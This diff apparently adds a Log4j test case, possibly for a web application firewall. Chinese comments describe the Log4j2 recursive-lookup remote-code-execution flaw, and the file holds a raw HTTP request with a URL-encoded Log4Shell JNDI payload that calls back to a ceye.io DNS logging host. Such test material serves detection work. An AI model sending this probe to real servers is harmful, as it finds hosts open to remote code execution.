@@ -1,0 +1,10 @@
+# Apache Log4j 代码问题漏洞-5101389
+# Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。
+GET /?id=$%7Bjndi:dns:%2F%2Fa9ujqv.ceye.io%2Fh5446rp%7D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&bid=hd_tag_m8mv25hf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25hf
+RM-PRO-Token: 5d8bfcef00346927c5b1f17add180066
+RM-PRO-Time: 1742808468400
+User-Agent: curl/7.83.1
+contentType: text
+
